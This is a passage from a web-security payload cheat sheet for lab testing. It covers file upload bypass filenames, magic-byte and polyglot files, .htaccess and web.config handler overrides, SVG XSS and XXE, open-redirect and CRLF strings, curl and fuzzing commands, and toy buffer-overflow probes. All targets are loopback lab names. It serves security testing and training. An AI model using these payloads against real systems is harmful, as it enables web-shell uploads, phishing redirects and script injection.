<!-- context: Chromium 126 and Express 4.19 with cors 2.8.5; victim and callback origins map to loopback and use a synthetic credentialed response marker; case: 12.3. Advanced CORS Bypass (Regex & Subdomain XSS Exploitation) -->
<!-- prerequisites: set fetch credentials mode and cookie SameSite/Secure policy explicitly, clear browser state and compare attacker versus allowlisted origins using the same endpoint -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: only the intentionally flawed regex/subdomain policy exposes the marker; canonical scheme-host-port comparison rejects every crafted origin; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python corsy.py -u "http://victim.lab.test" -p regex_bypass_origins.txt
    ```

---

## References

- **[S1]** OWASP WSTG — Testing Cross Origin Resource Sharing. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing — current version; accessed: 2026-07-18.

---

## 13. File Upload Bypass

> [!CAUTION]
> Only use in a local lab or clearly authorized system. Payloads with risk `destructive`, `dos`, or `oob` must be run in an isolated fixture, with resource limits and no outbound network.

> **Scope of use:** The payloads are lab examples according to the context/version noted in the annotation. Only use in local authorized fixtures; do not consider a syntactically correct payload as proof of exploitation on any system.

File Upload Bypass occurs when the file upload functionality to the server does not thoroughly check the file format, file content, or execution permissions, allowing an attacker to upload malicious code (Web Shell) and execute the source code.

> **Related Lesson:** [File Upload](06-insecure-design/file-upload/), [LFI/RFI](05-injection/lfi-rfi/), [Remote Code Execution](10-exceptional-conditions/remote-code-execution/).

### 13.1. File Extension & Name Manipulation Bypass
*   **Recognition / Signs**:
    *   *Notes*: When submitting a file download request with the `.php` extension, it is blocked and returns the error message "File extension not allowed".
    *   *English rewrite*: Standard `.php` file uploads return "extension not allowed" exceptions from application validators.

<!-- payload-id: CHEAT-13-001 -->
<!-- context: PHP 8.2 with Apache 2.4 and an isolated IIS 10 comparison fixture; uploads land on a noexec disposable volume; case: 13.1. File Extension & Name Manipulation Bypass -->
<!-- prerequisites: use inert marker content, disable execution on the upload volume, cap file size/count and restore the web-server configuration after each case -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the upload gate records each filename decision and stores only inert marker bytes; the fixed allowlist renames and keeps every file non-executable -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Use curl to upload a file with a double extension
    curl -F "file=@shell.p.phphp" http://victim.lab.test/upload
    # Use curl to upload a file with a mixed-case extension
    curl -F "file=@shell.pHp" http://victim.lab.test/upload
    ```
*   **Suspicion / Testing**:
    *   *Notes*: Try changing the file extension to an alternative one, toggle uppercase and lowercase, or insert a Null Byte.
    *   *English rewrite*: Change parameters to alternative extensions, mixed-case strings, or append null bytes.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-13-002 -->
<!-- context: PHP 8.2 with Apache 2.4 and an isolated IIS 10 comparison fixture; uploads land on a noexec disposable volume; case: 13.1. File Extension & Name Manipulation Bypass -->
<!-- prerequisites: use inert marker content, disable execution on the upload volume, cap file size/count and restore the web-server configuration after each case -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the upload gate records each filename decision and stores only inert marker bytes; the fixed allowlist renames and keeps every file non-executable -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
    # 1. Alternative PHP Extensions
    shell.php3                                           # Alternative PHP 3 execution handler
    shell.php4                                           # Alternative PHP 4 execution handler
    shell.php5                                           # Alternative PHP 5 execution handler
    shell.phtml                                          # Inline HTML/PHP parse bypass extension
    shell.phar                                           # PHP Archive executable file type extension

    # 2. Case Mutation Bypass
    shell.pHp                                            # Mixed-case extension bypass
    shell.PhP5                                           # Mixed-case PHP5 extension bypass
    shell.Phtml                                          # Mixed-case Phtml extension bypass

    # 3. Null Byte Injection (PHP <= 5.3.x) (⚠️ Version Warning: Null byte injection requires PHP < 5.3.4)
    shell.php%00.jpg                                     # ⚠️ URL encoded null byte truncation bypass (requires PHP < 5.3.4)
    shell.php\\x00.jpg                                    # ⚠️ Hexadecimal representation null byte bypass (requires PHP < 5.3.4)

    # 4. Path Traversal in Filename Parameter
    ../../../shell.php                                  # Directory traversal to escape upload container
    ..%2f..%2f..%2fshell.php                             # URL encoded traversal bypass

    # 5. Windows NTFS Alternate Data Streams (ADS) Bypass
    shell.php::$DATA                                     # Appends Windows alternate data stream structure
    shell.php:.jpg                                       # Creates secondary alternate JPEG stream
    shell.php::$DATA.jpg                                 # Windows ADS extension mapping bypass

    # 6. Double Extension & Regex Bypass (Replace once bypass)
    shell.p.phphp                                        # Resolves to shell.php if 'php' is stripped once
    shell.ph.phpphp                                      # Alternative double strip recursion bypass

    # 7. Trailing spaces/dots bypass
    shell.php. .                                         # Bypasses space trimming algorithms
    shell.php.                                           # Trailing dot Windows directory mapping bypass

    # 8. Semicolon IIS upload bypass
    shell.asp;.jpg                                       # IIS server executes file using first extension segment

    # 9. Reverse proxy double dot bypass
    ..%252f..%252fshell.php                              # Double-URL encoded traversal path

    # 10. Long extension truncation bypass
    shell.php.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.jpg       # Bypasses extension checks using buffer limits
```
*   **Automated Tool**:
    *   *Notes*: Use Burp Suite Intruder to fuzz file extension list alternatives from SecLists.
    *   *English rewrite*: Run Burp Suite Intruder to fuzz parameter extensions using alternative wordlists.


---

### 13.2. Content-Type & Signature Validation Bypass
*   **Recognition / Signs**:
    *   *Notes*: The application checks the file content structure (MIME type or Magic Bytes) instead of just checking the filename.
    *   *English rewrite*: Server evaluates file MIME-types or magic byte signatures instead of just the filename.

<!-- payload-id: CHEAT-13-003 -->
<!-- context: PHP 8.2 with Apache 2.4 and an isolated IIS 10 comparison fixture; uploads land on a noexec disposable volume; case: 13.2. Content-Type & Signature Validation Bypass -->
<!-- prerequisites: use inert marker content, disable execution on the upload volume, cap file size/count and restore the web-server configuration after each case -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: spoofed media type/signature does not make the marker executable; the fixed fixture verifies decoded content and stores it outside executable paths -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Use curl to upload a file with a spoofed Content-Type header
    curl -F "file=@shell.php;type=image/jpeg" http://victim.lab.test/upload
    ```
*   **Suspicion / Check**:
    *   *Notes*: Change the Header Content-Type value or insert characteristic image bytes (Magic Bytes) at the beginning of the Web Shell.
    *   *English rewrite*: Tamper with Content-Type headers or prepend image file signatures to code strings.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-13-004 -->
<!-- context: PHP 8.2 with Apache 2.4 and an isolated IIS 10 comparison fixture; uploads land on a noexec disposable volume; case: 13.2. Content-Type & Signature Validation Bypass -->
<!-- prerequisites: use inert marker content, disable execution on the upload volume, cap file size/count and restore the web-server configuration after each case -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: spoofed media type/signature does not make the marker executable; the fixed fixture verifies decoded content and stores it outside executable paths -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
    # 1. Magic Bytes JPEG Signature + PHP code (Raw Hex: FF D8 FF E0)
    \\xff\\xd8\\xff\\xe0<?php echo 'SECHUB_UPLOAD_MARKER'; ?> # JPEG signature plus inert marker

    # 2. Magic Bytes GIF Signature + PHP code (Raw Hex: 47 49 46 38 39 61, ASCII: GIF89a)
    GIF89a;\\n<?php echo 'SECHUB_UPLOAD_MARKER'; ?>       # GIF signature plus inert marker

    # 3. Magic Bytes PNG Signature + PHP code (Raw Hex: 89 50 4E 47 0D 0A 1A 0A)
    \\x89PNG\\r\\n\\x1a\\n<?php echo 'SECHUB_UPLOAD_MARKER'; ?> # PNG signature plus inert marker

    # 4. Magic Bytes PDF Signature + PHP code
    %PDF-1.4\\n<?php echo 'SECHUB_UPLOAD_MARKER'; ?>  # PDF signature plus inert marker

    # 5. Content-Type Header modification (JPEG)
    Content-Type: image/jpeg                             # Spoofs content type to indicate image resource

    # 6. Content-Type Header modification (PNG)
    Content-Type: image/png                              # Spoofs content type to indicate PNG resource

    # 7. Client-side JS validation bypass via request tampering (repeater)
    # Intercept request in proxy and change extension from .jpg to .php

    # 8. Image size validation bypass by copying valid image dimensions into payload
    # Inject inert marker into a large, valid image block

    # 9. Metadata EXIF field injection (injecting php shell in EXIF Artist field)
    # exiftool -Artist="SECHUB_UPLOAD_MARKER" marker.jpg

    # 10. Double Content-Type headers injection bypass
    # Content-Type: image/jpeg\\nContent-Type: application/x-php
```
*   **Automatic Tool**:
    *   *Notes*: Configure Burp Suite Intruder to send payloads and automatically change the corresponding Content-Type.
    *   *English rewrite*: Configure Burp Suite Intruder payloads to send and automatically change the corresponding Content-Type.


---

### 13.3. Web Server Configuration & File Execution Hijacking
*   **Identification / Signs**:
    *   *Notes*: Files are successfully uploaded but cannot be executed because the upload directory has disabled script execution.
    *   *English rewrite*: Files are successfully saved, but cannot execute due to write-only permissions on target folders.
*   **Suspicion / Check**:
    *   *Notes*: Try uploading configuration files (`.htaccess`, `web.config`) to reset the execution permissions of the directory, or use SVG, XSS/XXE and Polyglot PNG.
    *   *English rewrite*: Attempt loading directory configuration files (`.htaccess`), SVG files, or PNG polyglots.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-13-005 -->
<!-- context: PHP 8.2 with Apache 2.4 and an isolated IIS 10 comparison fixture; uploads land on a noexec disposable volume; case: 13.3. Web Server Configuration & File Execution Hijacking -->
<!-- prerequisites: use inert marker content, disable execution on the upload volume, cap file size/count and restore the web-server configuration after each case -->
<!-- encoding: XML bytes are serialized as UTF-8 to match the declaration; entity percent signs and character references are not decoded by an HTTP layer -->
<!-- expected-result: uploaded .htaccess/web.config/polyglot content remains inert on the noexec volume; the fixed server ignores per-upload handler configuration -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```xml
    <!-- 1. .htaccess configuration file upload to map .jpg to PHP handler -->
    # Uploaded filename: .htaccess
    # Content:
    AddType application/x-httpd-php .jpg

    <!-- 2. web.config configuration file upload (IIS) to map .jpg to ASP handler -->
    <!-- Uploaded filename: web.config -->
    <configuration>
      <system.webServer>
        <handlers>
          <add name="jpg-to-asp" path="*.jpg" verb="*" type="System.Web.UI.SimpleHandlerFactory" />
        </handlers>
      </system.webServer>
    </configuration>

    <!-- 3. SVG XSS Payload (triggers JS when viewed in browser) -->
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>

    <!-- 4. SVG XXE Payload (reads system files during parsing) -->
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///tmp/sechub-lab/fixture.txt" > ]>
    <svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">
      <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>

    <!-- 5. Polyglot PNG Payload (PHP code hidden in PLTE/IDAT chunks) -->
    <!-- Hex payload including PNG structure hosting an inert PHP marker -->
    \\x89\\x50\\x4E\\x47\\x0D\\x0A\x1A\\x0A\\x00\\x00\\x00\\x0D\\x49\\x48\\x44\\x52\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x08\\x03\\x00\\x00\\x00\\xF7\\xE1\\x1A\\x10\\x00\\x00\\x00\\x09\\x50\\x4C\\x54\\x45\\x3C\\x3F\\x70\\x68\\x70\\x20\\x65\\x63\\x68\\x6F\\x20\\x22\\x53\\x45\\x43\\x48\\x55\\x42\\x5F\\x55\\x50\\x4C\\x4F\\x41\\x44\\x5F\\x4D\\x41\\x52\\x4B\\x45\\x52\\x22\\x3B\\x20\\x3F\\x3E\\x00\\x00\\x00\\x0A\\x49\\x44\x41\x54\x78\x9C\x63\x60\x00\x00\x00\x02\x00\x01\\xE2\\x25\\xBC\\xE6\\x00\\x00\\x00\\x00\\x49\\x45\\x4E\\x4D

    <!-- 6. Polyglot GIF payload (GIF89a header + PHP tags) -->
    GIF89a;\\n<?php echo 'SECHUB_UPLOAD_MARKER'; ?>

    <!-- 7. .htaccess script execution protection disable override -->
    # Uploaded filename: .htaccess
    # Content:
    RemoveHandler .php
    AddType application/x-httpd-php .php

    <!-- 8. HTML injection via text file upload -->
    # Uploaded filename: test.txt. Content runs dynamic scripts in browser
    <html><body><script>alert(document.domain)</script></body></html>

    <!-- 9. Shellcode injection in image comments using exiftool -->
    # exiftool -Comment="SECHUB_UPLOAD_MARKER" image.png

    <!-- 10. CGI Script upload bypass -->
    # Uploaded filename: script.cgi. Content maps to perl execution
    #!/usr/bin/perl
    print "Content-type: text/html\\n\\n";
    print "SECHUB_CGI_MARKER";
```
*   **Automatic Tool**:
    *   *Notes*: Use the `exiftool` tool to automatically generate Polyglot image files containing malware.
    *   *English rewrite*: Deploy exiftool commands to compile valid image polyglots hosting scripts.<!-- payload-id: CHEAT-13-006 -->
<!-- context: PHP 8.2 with Apache 2.4 and an isolated IIS 10 comparison fixture; uploads land on a noexec disposable volume; case: 13.3. Web Server Configuration & File Execution Hijacking -->
<!-- prerequisites: use inert marker content, disable execution on the upload volume, cap file size/count and restore the web-server configuration after each case -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: uploaded .htaccess/web.config/polyglot content remains inert on the noexec volume; the fixed server ignores per-upload handler configuration -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    exiftool -Comment="SECHUB_UPLOAD_MARKER" marker.png
    ```

---

## References

- **[S1]** OWASP File Upload Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html — current version; accessed: 2026-07-18.

---

## 14. Open Redirect

> [!CAUTION]
> Only use in a local lab or clearly authorized system. Payloads with risk `destructive`, `dos`, or `oob` must be run in an isolated fixture, with resource limits and no outbound network.

> **Scope of use:** The payloads are lab examples according to the context/version noted in the annotation. Only use in local authorized fixtures; do not consider a syntactically correct payload as proof of exploitation on any system.

Open Redirect occurs when the application redirects users to an external address URL controlled by the user without verifying the destination domain, allowing attackers to carry out phishing campaigns.

> **Related lessons:** [Open Redirects](01-broken-access-control/open-redirects/), [Host Header Poisoning](02-security-misconfiguration/host-header-poisoning/), [OAuth Vulnerabilities](07-authentication-failures/oauth-vulnerabilities/).

### 14.1. Scheme & Domain-based Open Redirect (Absolute Redirect & Protocol-Relative Bypass)
*   **Identification / Signs**:
    *   *Notes*: When the application has parameters in URL specifying redirect paths such as `?redirect=`, `?next=`, `?url=`.
    *   *English rewrite*: Redirection parameters are present in URL query segments (such as `?next=`, `?redirect=`).
*   **Suspicion / Testing**:
    *   *Notes*: Submit a redirect request pointing to an external page or use double slash syntax `//callback.lab.test`.
    *   *English rewrite*: Pass external URLs or double slash sequences to test if server maps redirection to external locations.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-14-001 -->
<!-- context: Django 5.0 redirect fixture with trusted and callback HTTPS origins mapped to loopback; the client controls only the next query parameter; case: 14.1. Scheme & Domain-based Open Redirect (Absolute Redirect & Protocol-Relative Bypass) -->
<!-- prerequisites: run both origins locally, clear browser history and test one parser ambiguity at a time while recording the Location header and final origin -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable endpoint returns a Location to callback.lab.test; the fixed parser accepts only the documented local path or exact allowlisted origin -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
    # 1. Basic absolute redirect to external domain
    http://callback.lab.test                                  # Standard external redirection path

    # 2. Protocol-relative double slash bypass
    //callback.lab.test                                       # Browser resolves to scheme matching page protocol

    # 3. Protocol-relative triple slash bypass
    ///callback.lab.test                                      # Evades regexes strictly checking for two slashes

    # 4. Hex-encoded IP redirection target
    http://0x7f000001                                    # Bypasses string checks on loopback IP using Hex

    # 5. Decimal representation of loopback for a local-only parser test
    http://2130706433                                    # Resolves to 127.0.0.1 in compatible URL parsers

    # 6. Authentication bypass using @ separator
    http://trusted.lab.test@callback.lab.test                      # Browser connects to domain following @ symbol

    # 7. Authentication bypass with port mapping
    http://trusted.lab.test:80@callback.lab.test                   # Alternative port routing auth bypass

    # 8. IPv6 address redirection target
    http://[::1]                                         # Dynamic IPv6 loopback route bypass

    # 9. HTTPS to HTTP protocol forcing redirect
    http://callback.lab.test/                                 # Downgrades scheme parameter to HTTP

    # 10. Combined slash/backslash bypass
    /\\\\callback.lab.test                                     # Evades basic directory check algorithms
```
*   **Automatic Tool**:
    *   *Notes*: Use Oralyzer to scan for automatic redirect errors.
    *   *English rewrite*: Use Oralyzer to automatically scan for redirect errors.<!-- payload-id: CHEAT-14-002 -->
<!-- context: Django 5.0 redirect fixture with trusted and callback HTTPS origins mapped to loopback; the client controls only the next query parameter; case: 14.1. Scheme & Domain-based Open Redirect (Absolute Redirect & Protocol-Relative Bypass) -->
<!-- prerequisites: run both origins locally, clear browser history and test one parser ambiguity at a time while recording the Location header and final origin -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable endpoint returns a Location to callback.lab.test; the fixed parser accepts only the documented local path or exact allowlisted origin; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python oralyzer.py -u "http://victim.lab.test/?next=http://callback.lab.test"
    ```


---

### 14.2. Filter & Whitelist Bypass (Subdomain Spoofing & Path Traversal Bypass)
*   **Recognition / Signs**:
    *   *Notes*: When transmitting an external domain, it is blocked, but if the original domain is added, it can pass.
    *   *English rewrite*: Standard external redirects are blocked, but requests containing the target domain string pass.
*   **Suspicion / Testing**:
    *   *Notes*: Try adding the original domain as a subdomain, subdirectory, or use the `../` navigation character to bypass the configured trusted domain.
    *   *English rewrite*: Spoof whitelisted domains by nesting them in subdomains, query parameters, or directory segments.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-14-003 -->
<!-- context: Django 5.0 redirect fixture with trusted and callback HTTPS origins mapped to loopback; the client controls only the next query parameter; case: 14.2. Filter & Whitelist Bypass (Subdomain Spoofing & Path Traversal Bypass) -->
<!-- prerequisites: run both origins locally, clear browser history and test one parser ambiguity at a time while recording the Location header and final origin -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: crafted authority/userinfo/encoding reaches callback.lab.test only with the flawed comparison; canonical scheme-host-port matching rejects it -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
    # 1. Subdomain suffix spoofing
    http://callback.lab.test/trusted.lab.test                      # Tricked by presence of trusted segment in path

    # 2. Subdomain prefix spoofing
    http://trusted.lab.test.callback.lab.test                      # Tricked by trusted domain acting as subdomain

    # 3. Path traversal whitelist bypass
    http://trusted.lab.test/../callback.lab.test                   # Directory traversal escaping trusted segment

    # 4. Dynamic DNS wildcard bypass
    http://trusted-bypass.lab.test                            # Reserved fixture name mapped by local test DNS only

    # 5. Double URL encoded redirect parameters
    %252f%252fcallback.lab.test                               # Evades initial signature inspection filters

    # 6. Backslash Windows IIS redirect bypass
    http://trusted.lab.test\\\\callback.lab.test                     # IIS maps backslashes to parameters

    # 7. Null byte truncation whitelist bypass (⚠️ Warning: Null byte domain truncation in URLs is blocked/ignored by modern browsers and HTTP client libraries)
    http://callback.lab.test%00trusted.lab.test                    # ⚠️ Parser stops checking after Null Byte (requires legacy client runtime)

    # 8. Parameter spoofing using hash symbol
    http://callback.lab.test#trusted.lab.test                      # Evaluates trusted segment as URL fragment

    # 9. Parameter spoofing using query parameter
    http://callback.lab.test?trusted.lab.test                      # Evaluates trusted segment as query parameter

    # 10. Overlong UTF-8 slash encoding bypass
    ..%c0%af..%c0%afcallback.lab.test                         # Bypass using non-standard slash mappings
```
*   **Automatic Tool**:
    *   *Notes*: Use Oralyzer with a custom bypass whitelist.
    *   *English rewrite*: Configure Oralyzer to fuzz redirect parameters using custom bypass payloads.<!-- payload-id: CHEAT-14-004 -->
<!-- context: Django 5.0 redirect fixture with trusted and callback HTTPS origins mapped to loopback; the client controls only the next query parameter; case: 14.2. Filter & Whitelist Bypass (Subdomain Spoofing & Path Traversal Bypass) -->
<!-- prerequisites: run both origins locally, clear browser history and test one parser ambiguity at a time while recording the Location header and final origin -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: crafted authority/userinfo/encoding reaches callback.lab.test only with the flawed comparison; canonical scheme-host-port matching rejects it; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python oralyzer.py -u "http://victim.lab.test/?next=http://callback.lab.test" --fuzz
    ```


---

### 14.3. Parameter & Protocol Pollution (Parameter Pollution, JS/Data Redirection, CRLF)
*   **Identification / Signs**:
    *   *Notes*: The redirecting application uses a JavaScript mechanism or injects response parameters.
    *   *English rewrite*: The redirection application uses a JavaScript mechanism or inserts response parameters.

<!-- payload-id: CHEAT-14-005 -->
<!-- context: Django 5.0 redirect fixture with trusted and callback HTTPS origins mapped to loopback; the client controls only the next query parameter; case: 14.3. Parameter & Protocol Pollution (Parameter Pollution, JS/Data Redirection, CRLF) -->
<!-- prerequisites: run both origins locally, clear browser history and test one parser ambiguity at a time while recording the Location header and final origin -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the harness records how duplicate parameters and schemes are parsed; the fixed endpoint rejects ambiguity, CRLF and non-HTTP(S) destinations -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Test HTTP Parameter Pollution (HPP) redirect logic
    curl "http://victim.lab.test/?next=trusted.lab.test&next=callback.lab.test"
    # Test CRLF injection in the redirect parameter
    curl -I "http://victim.lab.test/?next=%0d%0aLocation:%20http://callback.lab.test"
    ```
*   **Suspicion / Testing**:
    *   *Notes*: Try transmitting the `javascript:` protocol or insert the `%0d%0a` newline character to inject the `Location` header.
    *   *English rewrite*: Test with `javascript:` URI schemes or inject CRLF sequences to split headers.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-14-006 -->
<!-- context: Django 5.0 redirect fixture with trusted and callback HTTPS origins mapped to loopback; the client controls only the next query parameter; case: 14.3. Parameter & Protocol Pollution (Parameter Pollution, JS/Data Redirection, CRLF) -->
<!-- prerequisites: run both origins locally, clear browser history and test one parser ambiguity at a time while recording the Location header and final origin -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: the harness records how duplicate parameters and schemes are parsed; the fixed endpoint rejects ambiguity, CRLF and non-HTTP(S) destinations -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. HTTP Parameter Pollution (HPP) bypass -->
    ?next=trusted.lab.test&next=callback.lab.test                  # Server reads secondary parameter value

    <!-- 2. JavaScript URI redirection -->
    javascript:alert(1)                                  # Executes javascript inside page environment

    <!-- 3. JavaScript location href redirection -->
    javascript:window.location='http://callback.lab.test'     # Redirects browser context to external site

    <!-- 4. Data URI redirection -->
    data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== # Loads base64 string directly in page

    <!-- 5. CRLF Injection redirection -->
    %0d%0aLocation:%20http://callback.lab.test                 # Injects header lines directly into HTTP response

    <!-- 6. VBScript URI redirection -->
    vbscript:msgbox("test")

    <!-- 7. HTML Entity encoded JS redirect -->
    javascript:&#x61;&#x6c;&#x65;&#x72;&#x74;(1)          # Obfuscates javascript function signatures

    <!-- 8. Redirect via meta refresh header injection -->
    %0d%0aRefresh:%200;url=http://callback.lab.test           # Forces browser reload routing to external URL

    <!-- 9. JS nested redirection in query parameters -->
    javascript:document.body.dataset.sechub='redirect-js-marker' # Local DOM marker; no cookie/network access

    <!-- 10. XML schema redirection inside SVG/XML files -->
    <svg xmlns="http://www.w3.org/2000/svg"><script href="javascript:alert(1)"/></svg>
```
*   **Automatic tool**:
    *   *Notes*: Use Burp Suite Repeater to manually check header responses when inserting the character CRLF or javascript protocol.
*   *English rewrite*: Use Burp Suite Repeater to manually check header responses when inserting the character CRLF or javascript protocol.

---

## References

- **[S1]** OWASP Unvalidated Redirects and Forwards Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html — current version; accessed: 2026-07-18.

---

## 15. Buffer Overflow / Binary Analysis

> [!CAUTION]
> Only run toy binaries in the local container with a timeout, CPU/memory/PID cap. Do not use shellcode, ROP open a shell, listener, or third-party binary.

> **Scope of use:** Only keep the probe that creates cyclic input, check build flags and AddressSanitizer in the lab. Hard-coded addresses and dependency chains of the binary have been removed.

Buffer overflow is writing beyond the boundaries of the destination memory. A crash does not automatically prove control of the instruction pointer; ASan trace, build flags, and input boundary must be recorded along with the conclusion.

> **Related lessons:** [Buffer Overflows](10-exceptional-conditions/buffer-overflows/), [Remote Code Execution](10-exceptional-conditions/remote-code-execution/), [Denial of Service](10-exceptional-conditions/denial-of-service/).

### 15.1. Cyclic input with limits

<!-- payload-id: CHEAT-15-001 -->
<!-- context: Ubuntu 22.04 x86-64, Python 3.12 and pwntools 4.12; input is passed only to the provided toy binary -->
<!-- prerequisites: compile the toy source with GCC 11.4 and AddressSanitizer; cap input at 256 bytes and disable core dumps/outbound network -->
<!-- encoding: Python bytes generated by pwntools; no text transcoding before argv/stdin -->
<!-- expected-result: the vulnerable build produces a bounded ASan out-of-bounds report; the fixed build rejects N+1 without a crash -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```python
from pwn import cyclic, cyclic_find

pattern = cyclic(128, n=4)
assert len(pattern) == 128

# Replace only with four bytes reported by the toy crash fixture.
observed = b"kaaa"
offset = cyclic_find(observed, n=4)
print(offset)
```
### 15.2. Build and ASan regression

<!-- payload-id: CHEAT-15-002 -->
<!-- context: GCC 11.4 on Ubuntu 22.04 x86-64; source and output paths are inside a disposable working directory -->
<!-- prerequisites: use only the repository toy source; set a process timeout and remove binary/logs after the test -->
<!-- encoding: UTF-8 Bash commands; argv input contains ASCII only -->
<!-- expected-result: the vulnerable build reports the exact write outside the destination; the secure build returns a validation error for the same input -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```bash
gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer toy.c -o toy-asan
timeout 2s ./toy-asan AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
### 15.3. Mitigation Check

<!-- payload-id: CHEAT-15-003 -->
<!-- context: checksec 2.6 against only the local toy binary compiled in the preceding fixture -->
<!-- prerequisites: do not infer absence/presence of a memory bug from mitigation flags; retain compiler command and binary hash -->
<!-- encoding: UTF-8 Bash command and ELF metadata output -->
<!-- expected-result: output records RELRO, canary, NX and PIE for the exact toy binary; it does not claim exploitability -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```bash
checksec --file=./toy-asan
```

## Supply Chain

> **Related Lesson:** [Supply Chain Attacks](03-supply-chain/supply-chain-attacks/), [Toxic Dependencies](03-supply-chain/toxic-dependencies/), [Subdomain Squatting](03-supply-chain/subdomain-squatting/).

The supply chain needs to consider dependencies, build pipeline, artifact registry, and update sources as attack surfaces. Quick indicators: newly added strange packages, changed maintainer/namespace, ignored lockfile, install scripts with side effects, artifacts not matching checksum or provenance. Main controls: mandatory lockfile, version pinning, review dependency diffs, sign artifacts, separate publishing and running SCA in CI with exception allowlist.

## Basic Cryptographic Failures

> **Related Lesson:** [Unencrypted Communication](04-cryptographic-failures/unencrypted-communication/), [Insecure Randomness](04-cryptographic-failures/insecure-randomness/), [Downgrade Attacks](04-cryptographic-failures/downgrade-attacks/), [SSL Stripping](04-cryptographic-failures/ssl-stripping/).

